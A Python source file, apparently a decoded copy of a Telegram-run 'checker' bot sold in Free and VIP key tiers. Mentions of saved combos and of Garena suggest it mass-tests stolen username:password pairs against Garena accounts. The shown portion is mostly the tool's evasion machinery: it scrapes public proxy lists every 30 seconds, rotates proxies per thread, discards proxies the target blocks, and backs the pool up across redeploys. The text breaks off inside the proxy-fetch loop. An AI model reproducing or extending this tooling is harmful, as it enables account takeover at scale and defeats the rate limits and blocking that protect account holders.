#Decode By Crazy | @PokiePy
import os
import sys
import time
import random
import hashlib
import uuid
import base64
import gc
from datetime import datetime, timezone
import json
import logging
import urllib.parse
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
from Crypto.Cipher import AES
from numpy import rint
import requests
import cloudscraper
import colorama
import threading
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich import box

colorama.init(autoreset=True)

console = Console()

class _SilentConsole:
    """Drop-in replacement for Rich Console — swallows all output in BOT_MODE."""
    def print(self, *a, **kw):
        if not BOT_MODE:
            bot_console.print(*a, **kw)
    def input(self, *a, **kw):
        return console.input(*a, **kw)

bot_console = _SilentConsole()

# ── Banner color shortcuts (used in print_banner) ──────────────
W   = '\033[0m'           # Reset
GR  = '\033[90m'          # Gray
R   = '\033[1;31m'        # Bold Red
RED = '\033[101m'         # BG Bright Red
B   = '\033[0;34m\033[1m' # Bold Blue
CY  = Fore.CYAN

# Global shutdown event for Ctrl+C handling
shutdown_event = Event()


# ── Liveness tracking — updated by key operations, checked by watchdog ──
_liveness_ts = time.time()           # last time the bot did something useful
_liveness_lock = threading.Lock()

def _touch_liveness():
    """Call this from key operations to prove the bot is alive."""
    global _liveness_ts
    with _liveness_lock:
        _liveness_ts = time.time()

def _get_liveness_age():
    """Return seconds since last liveness touch."""
    with _liveness_lock:
        return time.time() - _liveness_ts

# ── Thread exception hook — prevents silent thread crashes ──────
def _thread_exception_hook(args):
    logger = logging.getLogger(__name__)
    logger.error(f"[THREAD] ❌ Uncaught exception in thread {args.thread.name}: {args.exc_type.__name__}: {args.exc_value}")
threading.excepthook = _thread_exception_hook

# When True: suppress all per-account terminal prints so progress bars stay clean
BOT_MODE = False

# Per-user stop events — set to stop a running checker
_stop_events: dict = {}   # chat_id -> threading.Event()
_stop_events_lock = threading.Lock()

# Per-owner proxy accumulator — collects lines across multiple messages
_proxy_accumulator: dict = {}   # chat_id -> [raw_line, ...]
_broadcast_accumulator: dict = {}  # chat_id -> [text_line, ...]

# Per-owner proxy message tracker — message IDs to delete on Done
_proxy_msg_ids: dict = {}       # chat_id -> [msg_id, ...]

# Per-owner deletekey selection — tracks which keys are selected for deletion
_deletekey_selection: dict = {}  # chat_id -> set of key strings

# ══════════════════════════════════════════════════════════════
#  GLOBAL RESOURCE CONTROLS  — tuned for Railway
#
#  RAM per thread (lean sessions: pool_connections=3, pool_maxsize=5):
#    • cloudscraper session  ~5MB
#    • requests + TLS stack  ~3MB
#    • Python overhead       ~2MB
#    • ≈ 10MB per thread
#
#  50 threads × 10MB = ~500MB  →  safe on Railway's 512MB–8GB plans
#  Memory watchdog auto-throttles if RAM spikes.
# ══════════════════════════════════════════════════════════════

# Hard cap on total checker threads across ALL users at once
MAX_GLOBAL_THREADS   = 50     # Railway can handle 50 with lean sessions (~10MB each)
# Threads per individual Free user (limits one user hogging everything)
FREE_THREADS_PER_USER = 2     # Free key users: 2 threads — queued, waits for slot
# Max users running the checker simultaneously
MAX_CONCURRENT_USERS = 10     # 10 users supported concurrently
# VIP users get higher thread count for faster checking — NO QUEUE
VIP_THREADS_PER_USER = 10     # VIP users: 10 threads — instant, no queuing
# Legacy alias — kept for backward compat in some messages
MAX_THREADS_PER_USER = FREE_THREADS_PER_USER

# Global semaphore — enforces MAX_GLOBAL_THREADS hard cap
_global_thread_sem = threading.Semaphore(MAX_GLOBAL_THREADS)

# ══════════════════════════════════════════════════════════════
#  GEO PROXY CONFIG  (auto-reads all .txt files from proxy/ folder, loops)
# ══════════════════════════════════════════════════════════════
PROXY_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxy")
SAVED_COMBOS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "saved_combos")
SAVED_PROXIES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "saved_proxies")

def _init_proxy_folder():
    """Create proxy/ folder + a sample proxies.txt if folder didn't exist."""
    if not os.path.exists(PROXY_FOLDER):
        os.makedirs(PROXY_FOLDER, exist_ok=True)
        sample = os.path.join(PROXY_FOLDER, "proxies.txt")
        with open(sample, "w", encoding="utf-8") as f:
            f.write("# Add your proxies here (one per line)\n")
            f.write("# Supported formats:\n")
            f.write("#   ip:port                          (auto-detect: SOCKS5 if port is 1080/1081/4145/9050)\n")
            f.write("#   user:pass@ip:port\n")
            f.write("#   http://ip:port\n")
            f.write("#   http://user:pass@ip:port\n")
            f.write("#   https://ip:port\n")
            f.write("#   socks5://ip:port                 (recommended for HTTPS sites like Garena)\n")
            f.write("#   socks5://user:pass@ip:port\n")
            f.write("#   ip:port:user:pass\n")
            f.write("#\n")
            f.write("# SOCKS5 proxies are auto-detected by port number and work best for Garena.\n")
            f.write("# Free proxies are auto-fetched from multiple sources.\n")
        print(f"\033[92m📁 proxy/ folder created — add your proxy .txt files inside it\033[0m")

_init_proxy_folder()


# ═══════════════════════════════════════════════════════════════════
#  PERSISTENT PROXY STORAGE — survives Railway redeploys
#  proxy/        → ephemeral (used by GeoRotator, may be cleaned)
#  saved_proxies/→ persistent (never cleaned, backed up to KeyVault API)
# ═══════════════════════════════════════════════════════════════════

def _sync_proxies_to_saved():
    """Copy all proxy/*.txt files to saved_proxies/ for persistence across restarts.
    Called after any proxy change (upload, paste, fetch) to keep the backup current."""
    import shutil
    try:
        os.makedirs(SAVED_PROXIES_DIR, exist_ok=True)
        if not os.path.exists(PROXY_FOLDER):
            return
        for fname in os.listdir(PROXY_FOLDER):
            if not fname.endswith(".txt"):
                continue
            src = os.path.join(PROXY_FOLDER, fname)
            dst = os.path.join(SAVED_PROXIES_DIR, fname)
            if not os.path.isfile(src):
                continue
            try:
                shutil.copy2(src, dst)
            except Exception as e:
                logger.debug(f"[PROXY-PERSIST] Failed to sync {fname}: {e}")
        logger.debug(f"[PROXY-PERSIST] Synced proxy files to saved_proxies/")
    except Exception as e:
        logger.debug(f"[PROXY-PERSIST] Sync failed: {e}")


def _restore_proxies_from_saved():
    """Restore proxy files from saved_proxies/ to proxy/ on startup.
    Called before GeoRotator init so the proxy pool is populated from persistent storage.
    Skips files that already exist in proxy/ (doesn't overwrite newer uploads)."""
    import shutil
    try:
        if not os.path.exists(SAVED_PROXIES_DIR):
            return 0
        os.makedirs(PROXY_FOLDER, exist_ok=True)
        restored = 0
        for fname in os.listdir(SAVED_PROXIES_DIR):
            if not fname.endswith(".txt"):
                continue
            src = os.path.join(SAVED_PROXIES_DIR, fname)
            dst = os.path.join(PROXY_FOLDER, fname)
            if not os.path.isfile(src):
                continue
            if os.path.exists(dst):
                # Only overwrite if saved version is newer or proxy/ version is empty
                try:
                    src_size = os.path.getsize(src)
                    dst_size = os.path.getsize(dst)
                    if dst_size > 0 and dst_size >= src_size:
                        continue  # keep existing (likely same or newer)
                except Exception:
                    continue
            try:
                shutil.copy2(src, dst)
                restored += 1
                logger.info(f"[PROXY-PERSIST] Restored {fname} from saved_proxies/")
            except Exception as e:
                logger.debug(f"[PROXY-PERSIST] Failed to restore {fname}: {e}")
        if restored > 0:
            logger.info(f"[PROXY-PERSIST] Restored {restored} proxy file(s) from saved_proxies/")
        return restored
    except Exception as e:
        logger.debug(f"[PROXY-PERSIST] Restore failed: {e}")
        return 0


def _sync_proxies_to_keyvault():
    """Save all proxy file contents to KeyVault API for persistence across Railway redeploys.
    Each file is stored as a separate key: proxy_file_<filename>."""
    try:
        api = _get_keysystem_api()
        if not api.enabled:
            return
        # Save a manifest of all proxy filenames
        files = _get_proxy_files()
        manifest = []
        for fpath in files:
            fname = os.path.basename(fpath)
            try:
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    file_content = f.read()
                key = f"proxy_file_{fname}"
                api.save_state(key, {"content": file_content, "filename": fname})
                manifest.append(fname)
            except Exception as e:
                logger.debug(f"[PROXY-PERSIST] KeyVault sync failed for {fname}: {e}")
        # Save manifest
        api.save_state("proxy_manifest", {"files": manifest})
        logger.debug(f"[PROXY-PERSIST] Synced {len(manifest)} proxy file(s) to KeyVault API")
    except Exception as e:
        logger.debug(f"[PROXY-PERSIST] KeyVault sync failed: {e}")


def _restore_proxies_from_keyvault():
    """Load proxy file contents from KeyVault API and write to proxy/ folder.
    Called on startup after _restore_proxies_from_saved() as a fallback."""
    try:
        api = _get_keysystem_api()
        if not api.enabled:
            return 0
        # Load manifest
        manifest_data = api.load_state("proxy_manifest")
        if not manifest_data or not isinstance(manifest_data, dict):
            return 0
        manifest = manifest_data.get("files", [])
        if not manifest:
            return 0
        os.makedirs(PROXY_FOLDER, exist_ok=True)
        restored = 0
        for fname in manifest:
            key = f"proxy_file_{fname}"
            try:
                data = api.load_state(key)
                if not data or not isinstance(data, dict):
                    continue
                content = data.get("content", "")
                if not content or not content.strip():
                    continue
                dst = os.path.join(PROXY_FOLDER, fname)
                # Don't overwrite if file already exists with content
                if os.path.exists(dst):
                    try:
                        with open(dst, "r", encoding="utf-8", errors="ignore") as f:
                            existing = f.read()
                        if existing.strip():
                            continue  # keep local version
                    except Exception:
                        pass
                with open(dst, "w", encoding="utf-8") as f:
                    f.write(content)
                restored += 1
                logger.info(f"[PROXY-PERSIST] Restored {fname} from KeyVault API")
            except Exception as e:
                logger.debug(f"[PROXY-PERSIST] KeyVault restore failed for {fname}: {e}")
        if restored > 0:
            logger.info(f"[PROXY-PERSIST] Restored {restored} proxy file(s) from KeyVault API")
        return restored
    except Exception as e:
        logger.debug(f"[PROXY-PERSIST] KeyVault restore failed: {e}")
        return 0


def _persist_proxies():
    """Sync proxy files to both saved_proxies/ and KeyVault API.
    Call this after any proxy change (upload, paste, fetch)."""
    _sync_proxies_to_saved()
    _sync_proxies_to_keyvault()


def _restore_all_proxies():
    """Restore proxy files from all persistent sources (saved_proxies/ + KeyVault API).
    Called once at startup before GeoRotator init."""
    restored_local = _restore_proxies_from_saved()
    restored_api = _restore_proxies_from_keyvault()
    total = restored_local + restored_api
    if total > 0:
        logger.info(f"[PROXY-PERSIST] ✅ Total {total} proxy file(s) restored from persistent storage")
    return total


def _get_proxy_files():
    """
    Scan the proxy/ folder and return a sorted list of all non-empty .txt files.
    Re-scans the folder every call so newly added files are picked up at runtime.
    Files that exist but contain zero valid (non-comment) lines are skipped.
    """
    if not os.path.exists(PROXY_FOLDER):
        return []
    result = []
    for fname in sorted(os.listdir(PROXY_FOLDER), key=str.lower):
        if not fname.endswith(".txt"):
            continue
        fpath = os.path.join(PROXY_FOLDER, fname)
        if not os.path.isfile(fpath):
            continue
        # Only include files that have at least one non-blank, non-comment line
        try:
            with open(fpath, "r", encoding="utf-8", errors="ignore") as fh:
                has_content = any(
                    l.strip() and not l.strip().startswith("#")
                    for l in fh
                )
        except OSError:
            has_content = False
        if has_content:
            result.append(fpath)
    return result

PROXY_FILES = _get_proxy_files()

def backoff(attempt: int, base: float = 0.02, cap: float = 0.15) -> None:
    """Ultra-fast exponential backoff: 0.02s → 0.04s → 0.08s → 0.15s (capped)."""
    delay = min(base * (2 ** attempt), cap)
    time.sleep(delay)

class GeoRotator:
    """
    Auto-loads ALL .txt proxy files from the proxy/ folder at startup (sorted).
    - Merges all proxies from all files into one pool, deduplicates them.
    - Re-scans the folder dynamically so newly added .txt files are picked up.
    - Each thread gets its OWN proxy index to avoid conflicts.
    - Dead/blocked proxies are removed from memory AND their source file on disk.
    """

    def __init__(self):
        self._lock = Lock()
        self._file_idx = 0
        self._proxies = []
        self._proxy_source = {}     # proxy_url -> source filepath (for disk removal)
        self._thread_idx = {}
        self._thread_proxy = {}     # thread_ident -> last proxy URL handed to that thread
        self._global_idx = 0
        # Always re-scan folder on init so new files are picked up
        global PROXY_FILES
        PROXY_FILES = _get_proxy_files()
        self._load_all_files()
        self._current_proxy = self._proxies[0] if self._proxies else None

    # ── Known SOCKS5 ports — auto-detect SOCKS5 even without scheme ──
    _SOCKS5_PORTS = {1080, 1081, 4145, 4146, 9050, 9051, 9052, 9053, 10800, 10801, 28100}

    def _normalize_proxy(self, line):
        """
        Normalize a proxy line into a valid URL string.

        Supported input formats:
          1. http://host:port
          2. https://host:port
          3. socks5://host:port / socks5h://host:port
          4. http://user:pass@host:port
          5. https://user:pass@host:port
          6. socks5://user:pass@host:port
          7. host:port                          → auto-detect: SOCKS5 if known port, else http
          8. user:pass@host:port                → http://user:pass@host:port
          9. ip:port:username:password          → http://username:password@ip:port
         10. ip:port:username:password (https)  → detected if scheme prefix present

        Returns a normalized URL string, or None if the line is invalid.
        """
        original = line
        line = line.strip()
        if not line or line.startswith("#"):
            return None

        # ── Step 1: Detect and strip explicit scheme ──────────────────────────
        scheme = "http"  # default
        if line.lower().startswith("socks5h://"):
            scheme = "socks5h"
            line = line[10:]
        elif line.lower().startswith("socks5://"):
            scheme = "socks5h"  # use socks5h for remote DNS resolution
            line = line[8:]
        elif line.lower().startswith("socks4://"):
            scheme = "socks5h"  # upgrade socks4 to socks5h
            line = line[8:]
        elif line.lower().startswith("https://"):
            scheme = "https"
            line = line[8:]
        elif line.lower().startswith("http://"):
            scheme = "http"
            line = line[7:]

        # ── Step 2: Detect user:pass@host:port (already has @) ──
        if "@" in line:
            # Format: user:pass@host:port  — rebuild cleanly
            creds, _, hostport = line.partition("@")
            parts = hostport.rsplit(":", 1)
            if len(parts) == 2 and parts[1].isdigit():
                # Auto-detect SOCKS5 by port even with auth
                if scheme == "http" and int(parts[1]) in self._SOCKS5_PORTS:
                    scheme = "socks5h"
                return f"{scheme}://{creds}@{hostport}"
            logging.getLogger(__name__).warning(
                f"[GEO] ⚠️  Skipping malformed proxy (bad host:port after @): {original}"
            )
            return None

        # ── Step 3: Split by ':' to detect format ──────────────────────────
        parts = line.split(":")

        if len(parts) == 2:
            # Format: host:port
            host, port_str = parts
            if host and port_str.isdigit():
                # Auto-detect SOCKS5 by well-known ports
                if scheme == "http" and int(port_str) in self._SOCKS5_PORTS:
                    scheme = "socks5h"
                return f"{scheme}://{host}:{port_str}"

        elif len(parts) == 4:
            # Format: ip:port:username:password
            ip, port_str, username, password = parts
            if ip and port_str.isdigit():
                if scheme == "http" and int(port_str) in self._SOCKS5_PORTS:
                    scheme = "socks5h"
                return f"{scheme}://{username}:{password}@{ip}:{port_str}"

        elif len(parts) == 3:
            # Ambiguous — could be host:port:junk or user:pass:host (uncommon)
            # Try host:port (ignore third segment with a warning)
            host, port_str, extra = parts
            if host and port_str.isdigit():
                if scheme == "http" and int(port_str) in self._SOCKS5_PORTS:
                    scheme = "socks5h"
                logging.getLogger(__name__).warning(
                    f"[GEO] ⚠️  Proxy has 3 colon-parts, treating as host:port (ignoring '{extra}'): {original}"
                )
                return f"{scheme}://{host}:{port_str}"

        logging.getLogger(__name__).warning(
            f"[GEO] ⚠️  Skipping unrecognized proxy format: {original}"
        )
        return None

    def _load_proxies_from_file(self, filepath):
        """Read a proxy file and return list of (normalized_url, filepath) tuples."""
        if not os.path.exists(filepath):
            return []
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
        except OSError:
            return []
        result = []
        for line in lines:
            normalized = self._normalize_proxy(line)
            if normalized:
                result.append((normalized, filepath))
        return result

    def _load_all_files(self):
        """
        Re-scan proxy/ folder, load ALL .txt files, merge into one deduplicated pool.
        Called at startup and whenever the pool runs dry.
        Prints a summary table of files and proxy counts.
        """
        global PROXY_FILES
        PROXY_FILES = _get_proxy_files()
        log = logging.getLogger(__name__)

        if not PROXY_FILES:
            log.warning("[GEO] ⚠️  No proxy .txt files found in proxy/ folder — running without proxy!")
            self._proxies = []
            self._proxy_source = {}
            # ── Notify owner about no proxies ──────────────────
            try:
                if OWNER_ID and BOT_TOKEN:
                    _notify_no_proxy(BOT_TOKEN)
            except Exception:
                pass
            return False

        seen = set()
        merged = []
        source_map = {}
        file_counts = {}

        for filepath in PROXY_FILES:
            pairs = self._load_proxies_from_file(filepath)
            fname = os.path.basename(filepath)
            loaded = 0
            dupes = 0
            for url, src in pairs:
                if url in seen:
                    dupes += 1
                    continue
                seen.add(url)
                merged.append(url)
                source_map[url] = src
                loaded += 1
            file_counts[fname] = (loaded, dupes)
            if loaded:
                log.info(f"[GEO] 📄 {fname}: {loaded} proxies loaded" +
                         (f" ({dupes} dupes skipped)" if dupes else ""))
            else:
                log.warning(f"[GEO] ⚠️  {fname}: empty or all invalid — skipped")

        if not merged:
            log.warning("[GEO] ⚠️  All proxy files empty or invalid — running without proxy!")
            self._proxies = []
            self._proxy_source = {}
            # ── Notify owner about empty proxy pool ──────────────────
            try:
                if OWNER_ID and BOT_TOKEN:
                    _notify_no_proxy(BOT_TOKEN)
            except Exception:
                pass
            return False

        random.shuffle(merged)
        self._proxies = merged
        self._proxy_source = source_map
        self._thread_idx = {}

        log.info(f"[GEO] ✅ Proxy pool ready: {len(merged)} unique proxies across {len(PROXY_FILES)} file(s)")
        # ── Clear no-proxy warning since pool is loaded ────────
        try:
            _clear_no_proxy_warning()
        except Exception:
            pass
        return True

    def _load_next_file(self):
        """Alias kept for compatibility — delegates to _load_all_files."""
        return self._load_all_files()

    def _load_proxies(self):
        """Alias kept for compatibility."""
        return self._proxies

    def _get_thread_idx(self):
        """Get or assign a proxy index for the current thread."""
        tid = threading.get_ident()
        with self._lock:
            if tid not in self._thread_idx:
                # Assign each new thread a different starting proxy (round-robin)
                self._thread_idx[tid] = self._global_idx % len(self._proxies) if self._proxies else 0
                self._global_idx += 1
            return self._thread_idx[tid]

    def _advance_thread(self):
        """Advance THIS thread's proxy index forward within the unified pool."""
        tid = threading.get_ident()
        with self._lock:
            if not self._proxies:
                return None
            current = self._thread_idx.get(tid, 0)
            new_idx = (current + 1) % len(self._proxies)
            self._thread_idx[tid] = new_idx
            return self._proxies[new_idx]

    def get_proxies(self):
        """Return requests-compatible proxy dict for THIS thread's current proxy.
        Also records which proxy this thread is actively using for accurate removal."""
        if not self._proxies:
            return {}
        idx = self._get_thread_idx()
        proxy_url = self._proxies[idx]
        tid = threading.get_ident()
        with self._lock:
            self._thread_proxy[tid] = proxy_url
        return {"http": proxy_url, "https": proxy_url}

    def remove_blocked_proxy(self, proxy_url):
        """Remove a dead/blocked proxy from memory AND from its source file on disk.
        Lock is held only for the in-memory mutation; file I/O runs outside the lock."""
        if not proxy_url:
            return
        log = logging.getLogger(__name__)
        source_file = None
        pool_empty = False

        with self._lock:
            if proxy_url not in self._proxies:
                return
            # ── Remove from memory ────────────────────────────────────────────
            blocked_idx = self._proxies.index(proxy_url)
            self._proxies.remove(proxy_url)
            source_file = self._proxy_source.pop(proxy_url, None)
            self._thread_proxy.pop(proxy_url, None)  # clean up thread tracking
            log.warning(
                f"[GEO] 🗑️  Removed dead proxy from pool: {proxy_url} "
                f"({len(self._proxies)} remaining)"
            )
            # Fix all thread indices that pointed at or past the removed entry
            for tid in list(self._thread_idx.keys()):
                if self._thread_idx[tid] >= blocked_idx and self._thread_idx[tid] > 0:
                    self._thread_idx[tid] -= 1
            pool_empty = not self._proxies

        # ── Remove from the correct source file on disk (outside lock) ───────
        # _proxy_source gives us the exact file this proxy came from.
        # If missing (e.g. loaded before source tracking), fall back to scanning.
        if not source_file:
            for fpath in _get_proxy_files():
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as fh:
                        for line in fh:
                            stripped = line.strip()
                            if stripped and not stripped.startswith("#"):
                                if self._normalize_proxy(stripped) == proxy_url:
                                    source_file = fpath
                                    break
                except OSError:
                    pass
                if source_file:
                    break

        if source_file and os.path.exists(source_file):
            try:
                with open(source_file, "r", encoding="utf-8", errors="ignore") as fh:
                    lines = fh.readlines()
                new_lines = []
                removed_count = 0
                for line in lines:
                    stripped = line.strip()
                    if not stripped or stripped.startswith("#"):
                        new_lines.append(line)
                        continue
                    if self._normalize_proxy(stripped) == proxy_url:
                        removed_count += 1  # skip this line (delete from file)
                    else:
                        new_lines.append(line)
                with open(source_file, "w", encoding="utf-8") as fh:
                    fh.writelines(new_lines)
                if removed_count:
                    log.warning(
                        f"[GEO] 🗑️  Deleted proxy from {os.path.basename(source_file)} "
                        f"({removed_count} line(s) removed)"
                    )
                else:
                    log.warning(
                        f"[GEO] ⚠️  Proxy not found in {os.path.basename(source_file)} — "
                        f"may have been removed already or format mismatch"
                    )
            except Exception as e:
                log.error(f"[GEO] ❌ Failed to write proxy file {source_file}: {e}")
        else:
            log.warning(f"[GEO] ⚠️  Could not locate source file for proxy: {proxy_url}")


    def force_rotate(self):
        """Rotate THIS thread's proxy — remove the dead one, then return the next.
        Never returns None as long as there are proxies in any file."""
        tid = threading.get_ident()
        log = logging.getLogger(__name__)

        # Grab the proxy this thread actually used (recorded by get_proxies())
        with self._lock:
            blocked_proxy = (
                self._thread_proxy.get(tid)
                or (self._proxies[self._thread_idx.get(tid, 0)] if self._proxies else None)
            )
            self._thread_proxy.pop(tid, None)

        # Remove dead proxy from memory + disk
        if blocked_proxy:
            self.remove_blocked_proxy(blocked_proxy)

        # If pool is now empty after removal, reload from disk before advancing
        if not self._proxies:
            log.warning("[GEO] ⚠️  Pool empty after removal — reloading proxy files...")
            self._load_all_files()

        # Advance this thread to the next proxy in the (possibly reloaded) pool
        proxy_url = self._advance_thread()

        log.info(f"[GEO] ⚡ Thread {tid} rotated → {proxy_url}")
        return proxy_url

    def smart_rotate(self):
        """Fast rotate without removing — just skip to next proxy. Used for soft failures."""
        proxy_url = self._advance_thread()
        return proxy_url

    @property
    def current_proxy(self):
        if not self._proxies:
            return None
        idx = self._get_thread_idx()
        return self._proxies[idx]

    @property
    def total(self):
        return len(self._proxies)

# Singleton — created once, shared everywhere
# Wrapped in try/except so Railway deployment doesn't crash if proxy folder is empty
# ── Restore proxy files from persistent storage before initializing GeoRotator ──
try:
    _restore_all_proxies()
except Exception as _restore_err:
    logging.getLogger(__name__).warning(f"[PROXY-PERSIST] Restore failed: {_restore_err}")
try:
    geo_rotator = GeoRotator()
except Exception as _geo_err:
    logging.getLogger(__name__).warning(f"[GEO] ⚠️  GeoRotator init failed: {_geo_err} — running without proxy rotation")
    # Create a dummy rotator that does nothing
    class _DummyRotator:
        """Fallback rotator that actually loads proxy files when GeoRotator fails."""
        def __init__(self):
            self._proxies = []
            self._proxy_source = {}
            self._thread_idx = {}
            self._thread_proxy = {}
            self._global_idx = 0
            self.current_proxy = None
            self._lock = threading.Lock()
            self._load_all_files()
        @property
        def total(self):
            return len(self._proxies)
        def get_proxies(self): return {}
        def force_rotate(self): return None
        def smart_rotate(self): return None
        def remove_blocked_proxy(self, *a, **kw): pass
        def _advance_thread(self): return None
        def _get_thread_idx(self): return 0
        def _normalize_proxy(self, line):
            """Basic normalizer with socks5h support for when GeoRotator is unavailable."""
            line = line.strip()
            if not line or line.startswith("#"):
                return None
            low = line.lower()
            if low.startswith("socks5h://"):
                return line
            if low.startswith("socks5://"):
                return "socks5h://" + line[8:]
            if low.startswith("socks4://"):
                return "socks5h://" + line[8:]
            if low.startswith(("http://", "https://")):
                return line
            parts = line.split(":")
            if len(parts) == 2 and parts[1].isdigit():
                return f"http://{parts[0]}:{parts[1]}"
            if len(parts) == 4 and parts[1].isdigit():
                return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            return None
        def _load_all_files(self):
            """Actually load proxy files — not a no-op anymore."""
            try:
                proxy_files = _get_proxy_files()
                if not proxy_files:
                    return False
                seen = set()
                merged = []
                source_map = {}
                for filepath in proxy_files:
                    try:
                        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                            for line in f:
                                line = line.strip()
                                if not line or line.startswith("#"):
                                    continue
                                normalized = self._normalize_proxy(line)
                                if normalized and normalized not in seen:
                                    seen.add(normalized)
                                    merged.append(normalized)
                                    source_map[normalized] = filepath
                    except Exception:
                        continue
                if merged:
                    import random
                    random.shuffle(merged)
                    self._proxies = merged
                    self._proxy_source = source_map
                    self._thread_idx = {}
                    self.current_proxy = merged[0] if merged else None
                    # Clear any stale "no proxy" warning
                    try:
                        _clear_no_proxy_warning()
                    except Exception:
                        pass
                    return True
            except Exception:
                pass
            return False
    geo_rotator = _DummyRotator()

# ══════════════════════════════════════════════════════════════
#  RAW PROXY AUTO-FETCH
#  Periodically fetches proxies from external URL sources,
#  deduplicates against the current pool, and saves new ones.
# ══════════════════════════════════════════════════════════════
RAW_PROXY_SOURCES = [
    # ── (url, default_scheme) ── scheme is used for bare ip:port lines from that source
    # ── Primary source (custom worker) ──
    ("https://worker-production-a615.up.railway.app/", "http"),
    # ── ProxyScrape API (reliable, high volume) ──
    ("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=yes&anonymity=all", "http"),
    ("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=no&anonymity=elite", "http"),
    ("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&country=all", "socks5"),
    # ── SOCKS5 proxies (better for HTTPS tunneling) ──
    ("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", "socks5"),
    ("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt", "socks5"),
    ("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", "socks5"),
    # ── HTTP proxies (backup) ──
    ("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "http"),
    ("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt", "http"),
    ("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", "http"),
    # ── Additional reliable sources ──
    ("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt", "http"),
    ("https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt", "socks5"),
    ("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt", "socks5"),
    ("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt", "http"),
]
RAW_PROXY_FETCH_INTERVAL = 30  # 30 seconds — faster refresh for better proxy availability
RAW_PROXY_SAVE_FILE = os.path.join(PROXY_FOLDER, "raw_fetched_proxies.txt")

# ── Worker-only mode flag ── When True, the background _fetch_raw_proxies()
# skips its cycle so it doesn't overwrite proxies that were just renewed
# from the worker-only source via /renewproxy.
_worker_only_mode = False
_worker_only_lock = threading.Lock()



def _fetch_raw_proxies():
    """
    Background worker: fetches raw proxy lists from configured URLs every 30 seconds.
    All fetched proxies are saved directly — the checker naturally removes dead ones.
    Uses the correct scheme (http/socks5h) per source so SOCKS5 proxies
    are stored with the right protocol instead of all as http://.
    Wrapped in try/except so the thread never dies silently.
    """
    log = logging.getLogger(__name__)
    log.info(f"[RAW-PROXY] Auto-fetch thread started — {len(RAW_PROXY_SOURCES)} source(s), "
             f"interval {RAW_PROXY_FETCH_INTERVAL}s, save file: {RAW_PROXY_SAVE_FILE}")

    # Ensure proxy folder and save file exist before we start
    try:
        os.makedirs(PROXY_FOLDER, exist_ok=True)
        # Touch the save file so _get_proxy_files() can find it
        if not os.path.exists(RAW_PROXY_SAVE_FILE):
            with open(RAW_PROXY_SAVE_FILE, "w", encoding="utf-8") as f:
                f.write("# Auto-fetched proxies — do not edit manually\n")
            log.info(f"[RAW-PROXY] Created {RAW_PROXY_SAVE_FILE}")
    except Exception as e:
        log.error(f"[RAW-PROXY] Failed to create proxy folder/file: {e}")

    def _normalize_with_scheme(line, default_scheme="http"):
        """Normalize a proxy line using the correct scheme for its source."""
        line = line.strip()
        if not line or line.startswith("#"):
            return None
        # Already has a scheme? Use it as-is (upgrade socks5:// → socks5h:// for remote DNS)
        low = line.lower()
        if low.startswith("socks5h://"):
            return line
        if low.startswith("socks5://"):
            return "socks5h://" + line[8:]  # upgrade to socks5h for remote DNS resolution
        if low.startswith("socks4://"):
            return "socks5h://" + line[8:]  # upgrade socks4 to socks5h
        if low.startswith(("http://", "https://")):
            return line
        # Bare ip:port or ip:port:user:pass → apply the source's default scheme
        parts = line.split(":")
        if default_scheme == "socks5":
            scheme_str = "socks5h"  # always use socks5h for SOCKS5 sources (remote DNS)
        else:
            scheme_str = default_scheme
        if len(parts) == 2 and parts[1].isdigit():
            return f"{scheme_str}://{parts[0]}:{parts[1]}"
        if len(parts) == 4 and parts[1].isdigit():
            return f"{scheme_str}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return None

    while not shutdown_event.is_set():
        try:
            # ── If worker-only mode is active, skip this cycle entirely ──
            # /renewproxy set this flag so its worker-only proxies aren't overwritten
            with _worker_only_lock:
                if _worker_only_mode:
                    log.debug("[RAW-PROXY] Worker-only mode active — skipping auto-fetch cycle")
                    shutdown_event.wait(RAW_PROXY_FETCH_INTERVAL)
                    continue

            total_new = 0
            total_fetched = 0
            total_dupes = 0

            # ── Collect ALL proxies from ALL sources first, then write once ──
            # This replaces the old append-only approach that kept stale proxies forever.
            # Each cycle does a full rewrite so dead proxies are removed automatically.
            all_normalized = []   # ordered list of unique normalized proxies
            seen = set()

            for source_entry in RAW_PROXY_SOURCES:
                # Support both (url, scheme) tuples and plain url strings
                if isinstance(source_entry, tuple):
                    url, scheme = source_entry[0], source_entry[1]
                else:
                    url, scheme = source_entry, "http"

                try:
                    resp = requests.get(url, timeout=30)
                    resp.raise_for_status()
                    lines = [l.strip() for l in resp.text.splitlines()
                             if l.strip() and not l.strip().startswith("#")]
                except Exception as e:
                    log.debug(f"[RAW-PROXY] Failed to fetch {url}: {e}")
                    continue

                total_fetched += len(lines)

                source_new = 0
                dupes = 0
                for raw_line in lines:
                    try:
                        normalized = _normalize_with_scheme(raw_line, scheme)
